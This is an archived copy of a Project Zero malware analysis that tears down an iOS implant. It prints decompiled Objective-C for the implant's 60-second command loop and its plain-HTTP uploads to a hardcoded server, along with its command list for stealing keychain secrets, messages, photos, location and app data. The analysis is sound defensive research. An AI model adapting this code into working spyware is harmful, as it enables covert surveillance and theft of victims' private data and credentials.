{
    "id": "b067de4c-ae6f-4b25-bf80-a42c1257d668",
    "created_at": "2023-01-12T15:04:41.251477Z",
    "updated_at": "2025-03-27T02:16:39.972549Z",
    "deleted_at": null,
    "sha1_hash": "d6f31b4880c38447b2ccaedd6e23f6974bf98f56",
    "title": "2019-08-29 - Implant Teardown",
    "authors": "",
    "file_creation_date": "2022-05-27T21:28:13Z",
    "file_modification_date": "2022-05-27T21:28:13Z",
    "file_size": 1999346,
    "plain_text": "# Implant Teardown\n\n**[googleprojectzero.blogspot.com/2019/08/implant-teardown.html](https://googleprojectzero.blogspot.com/2019/08/implant-teardown.html)**\n\n## Posted by Ian Beer, Project Zero\n\nIn the earlier posts we examined how the attackers gained unsandboxed code execution as\nroot on iPhones. At the end of each chain we saw the attackers calling posix_spawn, passing\nthe path to their implant binary which they dropped in /tmp. This starts the implant running in\nthe background as root. There is no visual indicator on the device that the implant is running.\nThere's no way for a user on iOS to view a process listing, so the implant binary makes no\nattempt to hide its execution from the system.\n\nThe implant is primarily focused on stealing files and uploading live location data. The\nimplant requests commands from a command and control server every 60 seconds.\n\nBefore diving into the code let's take a look at some sample data from a test phone running\nthe implant and communicating with a custom command and control server I developed. To\nbe clear, I created this test specifically for the purposes of demonstrating what the implant\nenabled the attacker to do and the screenshots are from my device. The device here is an\niPhone 8 running iOS 12.\n\nThe implant has access to all the database files (on the victim’s phone) used by popular endto-end encryption apps like Whatsapp, Telegram and iMessage. We can see here\nscreenshots of the apps on the left and on the right the contents of the database files stolen\n\n\n-----\n\nby the implant which contain the unencrypted, plain-text of the messages sent and received\nusing the apps:\n\n### Whatsapp\n\n Telegram\n\n\n-----\n\n### iMessage\n\nHangouts\n\nHere's a conversation in Google Hangouts for iOS and the corresponding database file\nuploaded by the implant. With some basic SQL we can easily see the plain text of the\nmessages, and even the URL of the images shared.\n\n\n-----\n\nThe implant can upload private files used by all apps on the device; here's an example of the\nplaintext contents of emails sent via Gmail, which are uploaded to the attacker's server:\n\n### Gmail\n\nContacts\n\nThe implant also takes copies of the user's complete contacts database:\n\n\n-----\n\nPhotos\nAnd takes copies of all their photos:\n\n\n-----\n\nReal-time GPS tracking\nThe implant can also upload the user's location in real time, up to once per minute, if the\ndevice is online. Here's a real sample of live location data collected by the implant when I\ntook a trip to Amsterdam with the implant running on a phone in my pocket:\n\nThe implant uploads the device's keychain, which contains a huge number of credentials and\ncertificates used on and by the device. For example, the SSIDs and passwords for all saved\nwifi access points:\n\n<dict>\n<key>UUID</key>\n<string>3A9861A1-108E-4B3A-AAEC-C8C9DC79878E</string>\n<key>acct</key>\n<string>RandomHotelWifiNetwork</string>\n<key>agrp</key>\n<string>apple</string>\n<key>cdat</key>\n<date>2019-08-28T08:47:33Z</date>\n<key>class</key>\n<string>genp</string>\n<key>mdat</key>\n<date>2019-08-28T08:47:33Z</date>\n<key>musr</key>\n<data>\n</data>\n\n<key>pdmn</key>\n\n\n-----\n\n<string>ck</string>\n<key>persistref</key>\n<data>\n</data>\n<key>sha1</key>\n<data>\n1FcMkQWZGn3Iol70BW6hkbxQ2rQ=\n</data>\n<key>svce</key>\n<string>AirPort</string>\n<key>sync</key>\n<integer>0</integer>\n<key>tomb</key>\n<integer>0</integer>\n<key>v_Data</key>\n<data>\nYWJjZDEyMzQ=\n</data>\n</dict>\n\nThe v_Data field is the plain-text password, stored as base64:\n\n$ echo YWJjZDEyMzQ= | base64 -D\nabcd1234\n\nThe keychain also contains the long-lived tokens used by services such as Google's iOS\nSingle-Sign-On to enable Google apps to access the user's account. These will be uploaded\nto the attackers and can then be used to maintain access to the user's Google account, even\nonce the implant is no longer running. Here's an example using the Google OAuth token\nstored as com.google.sso.optional.1.accessToken in the keychain being used to log in to the\nGmail web interface on a separate machine:\n\n\n-----\n\nAnalysis\n\nThe implant is embedded in the privilege escalation Mach-O file in the __DATA:__file\nsection.\n\nFrom our analysis of the exploits, we know that the fake kernel task port (which gives kernel\nmemory read and write) is always destroyed at the end of the kernel exploit. The implant\nruns completely in userspace, albeit unsandboxed and as root with entitlements chosen by\nthe attacker to ensure they can still access all the private data they are interested in.\n\nUsing [jtool we can view the entitlements the implant has. Remember, the attackers have](http://www.newosxbook.com/tools/jtool.html)\ncomplete control over these as they used the kernel exploit to add the hash of the implant\nbinary's code signature to the kernel trust cache.\n\n$ jtool --ent implant\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>keychain-access-groups</key>\n<array>\n<string>*</string>\n</array>\n<key>application-identifier</key>\n<string>$(AppIdentifierPrefix)$(CFBundleIdentifier)</string>\n<key>com.apple.locationd.preauthorized</key>\n\n\n-----\n\n<true/>\n<key>com.apple.coretelephony.Identity.get</key>\n<true/>\n</dict>\n</plist>\n\nMany system services on iOS will try to check the entitlements of clients talking to them, and\nonly allow clients with particular entitlements to perform certain actions. This is why, even\nthough the implant is running as root and unsandboxed, it still requires a valid entitlements\nblob. They're assigning themselves three relevant entitlements:\n\n[keychain-access-groups is used to restrict access to secrets stored in the keychain; they've](https://developer.apple.com/documentation/bundleresources/entitlements/keychain-access-groups?language=objc)\ngiven themselves a wildcard value here.\n\n[com.apple.locationd.preauthorized enables the use of CoreLocation without explicit user](https://stackoverflow.com/questions/25608339/get-iphone-location-in-ios-without-preference-location-services-set-to-on)\nconsent, as long as Location Services is enabled.\n\n[com.apple.coretelephony.Identity.get allows retrieval of the device's phone number.](http://iphonedevwiki.net/index.php/CoreTelephony.framework)\n\n## Reversing\n\nThe binary is compiled without optimizations and written in Objective-C. The code snippets\n[here are mostly manually decompiled with a bit of help from hex-rays.](https://www.hex-rays.com/)\n\n### Structure\n\nThe implant consists of two Objective-C classes: Service and Util and a variety of helper\nfunctions.\n\nThe implant starts by creating an instance of the Service class and calling the start selector\n[before getting a handle to the current runloop and running it.](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/Multithreading/RunLoopManagement/RunLoopManagement.html)\n\n-[Service start] {\n[self startTimer];\n[self upload];\n}\n\n[Service startTimer] will ensure that the Service instance's timerHandle method is invoked\nevery 60 seconds:\n\n// call timer_handle every 60 seconds\n-[Service startTimer] {\ntimer = [NSTimer scheduledTimerWithTimeInterval:60.0\n\n\n-----\n\ntarget:self\nselector:SEL(timer_handle)\nuserInfo:NULL\nrepeats:1]\nold_timer = self->_timer;\nself->_timer = timer;\n[old_timer release]\n}\n\ntimer_handle is the main function responsible for handling the command and control\ncommunication. Before the device goes in to the timer_handle loop however it first does an\ninitial upload:\n\n-[Service upload] {\n[self uploadDevice];\n[self requestLocation];\n[self requestContacts];\n[self requestCallHistory];\n[self requestMessage];\n[self requestNotes];\n[self requestApps];\n[self requestKeychain];\n[self requestRecordings];\n[self requestSmsAttachments];\n[self requestSystemMail];\nif (!self->_defaultList) {\nself->_defaultList = [Util appPriorLists];\n}\n\n[self requestPriorAppData:self->_defaultList];\n[self requestPhotoData];\n\n...\n}\n\nThis performs an initial bulk upload of data from the device. Let's take a look at how these\nare implemented:\n\n-[Service uploadDevice] {\nNSLog(@\"uploadDevice\");\ninfo = [Util dictOfDeviceInfo];\nwhile( [self postFiles:info remove:1] == 0) {\n[NSThread sleepForTimeInterval:10.0];\n\n\n-----\n\ninfo = [Util dictOfDeviceInfo];\n}\n}\n\nNote the call to NSLog is really there in the production implant. If you connect the iPhone via\na lightning cable to a Mac and open Console.app you can see these log messages as the\nimplant runs.\n\nHere's [Util dictOfDeviceInfo]:\n\n+[Util dictOfDeviceInfo] {\nstruct utsname name = {};\nuname(&name);\nmachine_str = [NSString stringWithCString:name.machine\nencoding:NSUTF8StringEncoding]\n\n// CoreTelephony private API\ndevice_phone_number = CTSettingCopyMyPhoneNumber();\nif (!device_phone_number) {\ndevice_phone_number = @\"\";\n}\n\nnet_str = @\"Cellular\"\nif ([self isWifi]) {\nnet_str = @\"Wifi\";\n}\n\ndict = @{@\"name\":     [[UIDevice currentDevice] name],\n@\"iccid\":    [self ICCID],\n@\"imei\":     [self IMEI],\n@\"SerialNumber\": [self SerialNumber],\n@\"PhoneNumber\": device_phone_number,\n@\"version\":   [[UIDevice currentDevice] systemVersion]],\n@\"totaldisk\":  [NSNumber numberWithFloat:\n[[self getTotalDiskSpace] stringValue]],\n@\"freedisk\":   [NSNumber numberWithFloat:\n[[self getFreeDiskSpace] stringValue]],\n@\"platform\":   machine_str,\n@\"net\":     net_str}\n\npath = [@\"/tmp\" stringByAppendingPathComponent:[NSUUID UUIDString]];\n\n[dict writeToFile:path atomically:1]\n\n\n-----\n\nreturn @{@\"device.plist\": path}\n}\n\nHere's the output which gets sent to the server when the implant is run on one of my test\ndevices:\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>PhoneNumber</key>\n<string>+447848473659</string>\n<key>SerialNumber</key>\n<string>F4GW60LKJC68</string>\n<key>freedisk</key>\n<string>48.63801</string>\n<key>iccid</key>\n<string>8944200115179096289</string>\n<key>imei</key>\n<string>352990092967294</string>\n<key>name</key>\n<string>Ian Beer’s iPhone</string>\n<key>net</key>\n<string>Wifi</string>\n<key>platform</key>\n<string>iPhone10,4</string>\n<key>totaldisk</key>\n<string>59.59484</string>\n<key>version</key>\n<string>12.1.2</string>\n</dict>\n</plist>\n\nThis method collects a myriad of identifiers from the device:\n\nthe iPhone model\nthe iPhone name (\"Ian's iPhone\")\nthe [ICCID of the SIM card, which uniquely identifies the SIM](https://en.wikipedia.org/wiki/SIM_card#ICCID)\nthe iPhone serial number\nthe current phone number\nthe iOS version\ntotal and free disk space\n\n\n-----\n\nthe currently active network interface (wifi or cellular)\n\nThey build an Objective-C dictionary object containing all this information then use the\n[NSUUID class to generate a pseudo-random, unique string. They use that string to create a](https://developer.apple.com/documentation/foundation/nsuuid?language=objc)\nnew file under /tmp, for example /tmp/68753A44-4D6F-1226-9C60-0050E4C00067. They\nserialize the dictionary object as XML to that file and return a dictionary @{@\"device.plist\":\npath} mapping the name \"device.plist\" to that path in /tmp. This rather odd design pattern of\nserializing everything to files in /tmp is used throughout the implant.\n\nLet's take a look at how that file will get off the device and up to the attacker's server.\n\n[Service uploadDevice] passes the returned @{@\"device.plist\": path} dictionary to [Service\npostFiles]:\n\n[self postFiles:info remove:1]\n\n-[Service postFiles:files remove:] {\nif([[files allKeys] count] == 0) {\nreturn;\n}\n\nsem = dispatch_semaphore_create(0.0)\n\nbase_url_str = [\n[@\"http://X.X.X.X\" stringByTrimmingCharactersInSet:\n[NSCharacterSet whitespaceAndNewlineCharacterSet]]]\n\nfull_url_str = [base_url_str stringByAppendingString:@\"/upload/info\"]\n\nurl = [NSURL URLWithString:full_url_string]\n\nreq = [NSMutableURLRequest requestWithURL:url]\n[req setHTTPMethod:@\"POST\"]\n[req setTimeoutInterval:120.0]\n\ncontent_type_str = [NSString stringWithFormat:\n\"multipart/form-data; charset=utf-8;boundary=%@\", @\"9ff7172192b7\"];\n[req setValue:content_type_str forHTTPHeaderField:@\"Content-Type\"]\n\n// this is set in [Service init], it's SerialNumber\n// from [Util SerialNumber]\nparams_dict = @{@\"sn\": self->_sn}\nbody_data = [self buildBodyDataWithParams:params_dict AndFiles:files]\n\n\n-----\n\nsession = [NSURLSession sharedSession]\nNSURLSessionUploadTask* task = [session uploadTaskWithRequest:req\nfromData:body_data\ncompletionHandler:\n^(NSData *data, NSURLResponse *response, NSError *error){\n\nif (error) {\nNSLog(@\"postFile %@ Error: %@\", _, _)\n} else {\nNSLog(@\"postFile success %@\");\n}\n\nif (remove) {\n// use NSFileManager to remove all the files\n}\n\ndispatch_semaphore_signal(sem)\n\n}]\n\n[task resume];\n\ndispatch_semaphore_wait(sem, -1);\n\nThe IP address of the server to upload content to is hardcoded in the implant binary. This\nfunction uses that address to make an HTTP POST request, passing the contents of the files\nprovided in the files argument as a multipart/form-data payload (with the hardcoded\nboundary string \"9ff7172192b7\" delimiting the fields in the body data.)\n\nLet's take a quick look at buildBodyDataWithParams:\n\n[-Service buildBodyDataWithParams:params AndFiles:files] {\ndata = [NSMutableData data]\nfor (key in params) {\nstr = [NSMutableString string]\n// the boundary string\n[str appendFormat:@\"--%@\\r\\n\", \"9ff7172192b7\"] ;\n[str appendFormat:\n@\"Content-Disposition: form-data; name=\\\"%@\\\"\\r\\n\\r\\n\", key];\n\nval = [params objectForKeyedSubscript:key];\n[str appendFormat:@\"%@\\r\\n\", val];\n\n\n-----\n\nencoded = [str dataUsingEncoding:NSUTF8StringEncoding];\n[data appendData:encoded]\n}\n\nfor (file in files) {\nstr = [NSMutableString string];\n// the boundary string\n[str appendFormat:@\"--%@\\r\\n\", \"9ff7172192b7\"] ;\n[str appendFormat:\n@\"Content-disposition: form-data; name=\\\"%@\\\"; filename=\\\"%@\\\"\\r\\n\",\nfile, file];\n[str appendFormat:@\"Content-Type: application/octet-stream\\r\\n\\r\\n\"];\n\nencoded = [str dataUsingEncoding:NSUTF8StringEncoding];\n[data appendData:encoded];\n\nfile_path = [files objectForKeyedSubscript:file];\nfile_data = [NSData dataWithContentsOfFile:file_path];\n[data appendData:file_data];\n\nnewline_encoded = [@\"\\r\\n\" dataUsingEncoding:NSUTF8StringEncoding];\n[data appendData newline_encoded] ;\n}\n\nfinal_str = [NSString stringWithFormat:@\"--%@--\\r\\n\", @\"9ff7172192b7\"];\nfinal_encoded = [final_str dataUsingEncoding:NSUTF8StringEncoding];\n[data appendData:final_encoded];\n\nreturn data\n}\n\nThis is just building a typical HTTP POST request body, embedding the contents of each file\nas form data.\n\nThere's something thus far which is conspicuous only by its absence: is any of this\nencrypted? The short answer is no: they really do POST everything via HTTP (not HTTPS)\nand there is no asymmetric (or even symmetric) encryption applied to the data which is\nuploaded. Everything is in the clear. If you're connected to an unencrypted WiFi network this\ninformation is being broadcast to everyone around you, to your network operator and any\nintermediate network hops to the command and control server.\n\n\n-----\n\nThis means that not only is the end-point of the end-to-end encryption offered by messaging\napps compromised; the attackers then send all the contents of the end-to-end encrypted\nmessages in plain text over the network to their server.\n\n### The command loop\n\nOn initial run (immediately after the iPhone has been exploited) the implant performs around\na dozen bulk uploads in a similar fashion before going to sleep and being woken up by the\noperating system every 60 seconds. Let's look at what happens then:\n\nNSTimer will ensure that the [Service timer_handle] method is called every 60 seconds:\n\n-[Service timer_handle] {\nNSLog(@\"timer trig\")\n[self status];\n[self cmds];\n}\n\n[Service status] uses the [SystemConfiguration framework to determine whether the device is](https://developer.apple.com/documentation/systemconfiguration?language=objc)\ncurrently connected via WiFi or mobile data network.\n\n[Service cmds] calls [Service remotelist]:\n\n-[Service cmds] {\nNSLog(@\"cmds\");\n[self remotelist];\nNSLog(@\"finally\");\n}\n\n-[Service remotelist] {\nws_nl = [NSCharacterSet whitespaceAndNewlineCharacterSet];\nurl_str = [remote_url_long stringByTrimmingCharacterInSet:ws_nl];\n\nNSMutableURLRequestRef url_req = [NSMutableURLRequest alloc];\n\nfull_url_str = [url_str stringByAppendingString:@\"/list\"];\nNSURLRef url = [NSURL URLWithString:full_url_str];\n\n[url_req initWithURL:url];\n\nif (self->_cookies) {\n[url_req addValue:self->_cookies forHeader:@\"Cookie\"];\n}\n\n\n-----\n\nNSURLResponse* resp;\nNSData* data = [NSURLConnection sendSynchronousRequest:url_req\nreturningResponse:&resp\nerror:0];\n\ncookie = [self getCookieFromHttpresponse:resp];\nif ([cookie length] != 0) {\nself->_cookie = cookie;\n}\n\nNSLog(@\"Json data %@\", [NSString initWithData:data\nencoding:NSUTF8StringEncoding]);\n\nerr = 0;\njson = [NSJSONSerialization JSONObjectWithData:data\noptions:0\nerror:&err];\n\ndata_obj = [json objectForKey:@\"data\"];\n\nNSLog(@\"data Result: %@\", data_obj);\n\ncmds_obj = [data_obj objectForKey:@\"cmds\"];\n\nNSLog(@\"cmds: %@\", cmds_obj);\n\nfor (cmd in cmds_obj) {\n[self doCommand:cmd];\n}\n}\n\nThis method makes an HTTP request to the /list endpoint on the command and control\nserver and expects to receive a JSON-encoded object in the response. It parses that object\n[using the system JSON library (NSJSONSerialization), expecting the JSON to be in the](https://developer.apple.com/documentation/foundation/nsjsonserialization)\nfollowing form:\n\n{ \"data\" :\n{ \"cmds\" :\n[\n{\"cmd\" : <COMMAND_STRING>\n\"data\" : <OPTIONAL_DATA_STRING>\n\n}, ...\n\n\n-----\n\n]\n}\n}\n\nEach of the enclosed commands are passed in turn to [Service doCommand]:\n\n-[Service doCommand:cmd_dict] {\ncmd_str_raw = [cmd_dict objectForKeyedSubscript:@\"cmd\"]\n\ncmd_str = [cmd_str_raw stringByTrimmingCharactersInSet:\n[NSCharacterSet whitespaceAndNewlineCharacterSet]];\n\nif ([cmd_str isEqualToString:@\"systemmail\"]) {\n[self requestSystemMail];\n} else if([cmd_str isEqualToString:@\"device\"]) {\n[self uploadDevice];\n} else if([cmd_str isEqualToString:@\"locate\"]) {\n[self requestLocation];\n} else if([cmd_str isEqualToString:@\"contact\"]) {\n[self requestContact];\n} else if([cmd_str isEqualToString:@\"callhistory\"]) {\n[self requestCallHistory];\n} else if([cmd_str isEqualToString:@\"message\"]) {\n[self requestMessage];\n} else if([cmd_str isEqualToString:@\"notes\"]) {\n[self requestNotes];\n} else if([cmd_str isEqualToString:@\"applist\"]) {\n[self requestApps];\n} else if([cmd_str isEqualToString:@\"keychain\"]) {\n[self requestKeychain];\n} else if([cmd_str isEqualToString:@\"recordings\"]) {\n[self requestRecordings];\n} else if([cmd_str isEqualToString:@\"msgattach\"]) {\n[self requestSmsAttachments];\n} else if([cmd_str isEqualToString:@\"priorapps\"]) {\nif (!self->_defaultList) {\nself->_defaultList = [Util appPriorLists]\n}\n[self requestPriorAppData:self->_defaultList]\n} else if([cmd_str isEqualToString:@\"photo\"]) {\n[self uploadPhoto];\n} else if([cmd_str isEqualToString:@\"allapp\"]) {\n\ndispatch async( dispatch main q, ^(app)\n\n\n-----\n\n{\n[self requestAllAppData:app]\n});\n} else if([cmd_str isEqualToString:@\"app\"]) {\n// parameter should be an array of bundle ids\ndata = [cmd_dict objectForKey:@\"data\"]\nif ([data count] != 0) {\n[self requestPriorAppData:data]\n}\n} else if([cmd_str isEqualToString:@\"dl\"]) {\n[@\"/tmp/evd.\" stringByAppendingString:[[[NSUUID UUID] UUIDString] substringToIndex:\n4]]\n// it doesn't actually seem to do anything here\n} else if([cmd_str isEqualToString:@\"shot\"]) {\n// nop\n} else if([cmd_str isEqualToString:@\"live\"]) {\n// nop\n}\n\ncs = [NSCharacterSet whitespaceAndNewlineCharacterSet];\nserver = [@\"http://X.X.X.X:1234\" stringByTrimmingCharactersInSet:cs];\n\nfull_url_str = [server stringByAppendingString:@\"/list/suc?name=\"];\nurl = [NSURL URLWithString:[full_url_str stringByAppendingString:cmd_str]];\nNSLog(@\"s_url: %@\", url)\n\nreq = [[NSMutableURLRequest alloc] initWithURL:url];\nif (self->_cookies) {\n[req addValue:self->_cookies forHTTPHeaderField:@\"Cookie\"];\n}\n\nid resp;\n[NSURLConnection sendSynchronousRequest:req\nreturningResponse: &resp\nerror: nil];\n\nresp_cookie = [self getCookieFromHttpresponse:resp]\nif ([resp_cookie length] == 0) {\nself->_cookie = nil;\n} else {\nself->_cookie = resp_cookie;\n}\n\n\n-----\n\nNSLog(@\"cookies: %@\", self->_cookie)\n}\n\nThis method takes a dictionary with a command and an optional data argument. Here's a list\nof the supported commands:\n\nsystemmail : upload email from the default Mail.app\ndevice   : upload device identifiers\n(IMEI, phone number, serial number etc)\nlocate   : upload location from CoreLocation\ncontact   : upload contacts database\ncallhistory : upload phone call history\nmessage   : upload iMessage/SMSes\nnotes    : upload notes made in Notes.app\napplist   : upload a list of installed non-Apple apps\nkeychain  : upload passwords and certificates stored in the keychain\nrecordings : upload voice memos made using the built-in voice memos app\nmsgattach  : upload SMS and iMessage attachments\npriorapps  : upload app-container directories from hardcoded list of\nthird-party apps if installed (appPriorLists)\nphoto    : upload photos from the camera roll\nallapp   : upload container directories of all apps\napp     : upload container directories of particular apps by bundle ID\ndl     : unimplemented\nshot    : unimplemented\nlive    : unimplemented\n\nEach command is responsible for uploading its results to the server. After each command is\ncomplete a GET request is made to the /list/suc?name=X endpoint, where X is the name of\nthe command which completed. A cookie containing the device serial number is sent along\nwith the GET request.\n\nThe majority of these commands work by creating tar archives of fixed lists of directories\nbased on the desired information and the version of iOS which is running. Here, for example,\nis the implementation of the systemmail command:\n\n-[Service requestSystemMail] {\nNSLog(@\"requestSystemMail\")\nmaildir = [Util dirOfSystemMail]\nif ([maildir length] != 0) {\n[Util tarWithSplit:maildir\nname:@\"systemmail\"\n\n\n-----\n\nblock: (id files) // dictionary {filename:filepath}\n{\nwhile ([self postFiles:files] == 0) {\n[NSThread sleepForTimeInterval:10.0]\n}\n}\n]\n}\n}\n\n+[Util dirOfSystemMail] {\nreturn @\"/private/var/mobile/Library/Mail\";\n}\n\nThis uses the [Util tarWithSplit] method to archive the contents of the\n/private/var/mobile/Library/Mail folder, which contains the contents of all locally-stored email\nsent and received with the built-in Apple Mail.app.\n\nHere's another example of a command, locate, which uses CoreLocation to request a\ngeolocation fix for the device. Because the implant has the\ncom.apple.locationd.preauthorized entitlement set to true this will not prompt the user for\npermission to access their location.\n\n-[Service requestLocation] {\nNSLog(@\"requestLocation\");\nself->_locating = 1;\n\nif (!self->_lm) {\nlm = [[CLLocationManager alloc] init];\n[self->_lm release];\nself->_lm = lm;\n\n// the delegate's locationManager:didUpdateLocations: selector\n// will be called when location information is available\n[self->_lm setDelegate:self];\n[self->_lm setDesiredAccuracy:kCLLocationAccuracyBest];\n}\n\n[self->lm startUpdatingLocation];\n}\n\n-[Service locationManager:manager didUpdateLocations:locations] {\n[self stopUpdatingLocation];\n\n\n-----\n\nloc = [locations lastObject];\nif (self->_locating) {\nstruct CLLocationCoordinate2D coord = [loc coordinate];\ndict = @{@\"lat\" : [NSNumber numberWithDouble:coord.latitude],\n@\"lon\" : [NSNumber numberWithDouble:coord.longitude]};\n\npath = [@\"/tmp\" stringByAppendingPathComponent[NSUUID UUIDString];\n[dict writeToFile:path atomically:1];\n\nwhile(1){\nfdict = @{@\"gps.plist\": path};\nif([self postFiles:fdict remove:1]) {\nbreak;\n}\n\n[NSThread sleepForTimeInterval:10.0];\n}\n}\n\nHere's the response to the location command, which can be sent up to every 60 seconds\n(note: I have changed the location to be the peak of the Matterhorn in Switzerland):\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>lat</key>\n<real>45.976451000646013</real>\n<key>lng</key>\n<real>7.6585657688044914</real>\n</dict>\n</plist>\n\n### App contents\n\nVarious implant commands enable the attackers to steal the container directories of thirdparty apps. The implant contains a hardcoded list of apps which will always have their\ncontainer directories uploaded when the implant starts up. The command-and-control server\ncan also query for a list of all 3rd party apps and request uploads of their container\ndirectories.\n\n\n-----\n\nThese container directories are where most iOS apps store all their data; for example, this is\nwhere end-to-end encryption apps store unencrypted copies of all sent and received\nmessages.\n\nHere's the pre-populated list of bundle identifiers for third-party apps, which will always have\ntheir container directories uploaded if the apps are installed:\n\ncom.yahoo.Aerogram\ncom.microsoft.Office.Outlook\ncom.netease.mailmaster\ncom.rebelvox.voxer-lite\ncom.viber\ncom.google.Gmail\nph.telegra.Telegraph\ncom.tencent.qqmail\ncom.atebits.Tweetie2\nnet.whatsapp.WhatsApp\ncom.skype.skype\ncom.facebook.Facebook\ncom.tencent.xin\n\nIf the attackers were interested in other apps installed on the device they could use a\ncombination of the applist and app commands to get a listing of all installed app ids, then\nupload a particular app's container directory by id. The allapp command will upload all the\ncontainer directories for all apps on the device.\n\n### Impact\n\nThe implant has access to almost all of the personal information available on the device,\nwhich it is able to upload, unencrypted, to the attacker's server. The implant binary does not\npersist on the device; if the phone is rebooted then the implant will not run until the device is\nre-exploited when the user visits a compromised site again. Given the breadth of information\nstolen, the attackers may nevertheless be able to maintain persistent access to various\naccounts and services by using the stolen authentication tokens from the keychain, even\nafter they lose access to the device.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-08-29 - Implant Teardown.pdf"
    ],
    "report_names": [
        "2019-08-29 - Implant Teardown.pdf"
    ],
    "threat_actors": [
        {
            "id": "2864e40a-f233-4618-ac61-b03760a41cbb",
            "created_at": "2023-12-01T02:02:34.272108Z",
            "updated_at": "2025-03-27T02:02:10.209072Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "ETDA:WildCard",
            "tools": [
                "RustDown",
                "SysJoker"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "256a6a2d-e8a2-4497-b399-628a7fad4b3e",
            "created_at": "2023-11-30T02:00:07.299845Z",
            "updated_at": "2025-03-27T02:00:03.257794Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "MISPGALAXY:WildCard",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535881,
    "ts_updated_at": 1743041799,
    "ts_creation_date": 1653686893,
    "ts_modification_date": 1653686893,
    "files": {
        "pdf": "https://archive.orkl.eu/d6f31b4880c38447b2ccaedd6e23f6974bf98f56.pdf",
        "text": "https://archive.orkl.eu/d6f31b4880c38447b2ccaedd6e23f6974bf98f56.txt",
        "img": "https://archive.orkl.eu/d6f31b4880c38447b2ccaedd6e23f6974bf98f56.jpg"
    }
}